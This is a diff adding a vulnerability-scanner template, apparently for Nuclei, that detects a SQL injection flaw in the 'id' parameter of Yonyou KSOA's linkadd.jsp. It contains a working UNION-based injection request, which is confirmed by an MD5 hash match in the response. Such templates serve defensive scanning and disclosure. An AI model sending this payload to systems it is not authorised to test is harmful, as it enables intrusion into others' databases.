@@ -1,0 +1,26 @@
+id: yonyou-ksoa-sqli
+info:
+  name: Yonyou KSOA linkadd.jsp id SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    UFIDA KSOA is an enterprise-level application performance management (APM) software. The software has a SQL injection vulnerability in the parameter `id` of the `linkadd.jsp` file. Attackers can use this vulnerability to gain unauthorized access to database information or escalate privileges on the server.
+
+http:
+  - raw:
+      - |
+        GET /linksframe/linkadd.jsp?id=666666%27%20union%20all%20select%20null,null,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),null,null,null HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "0xe10adc3949ba59abbe56e057f20f883e"
+        part: body
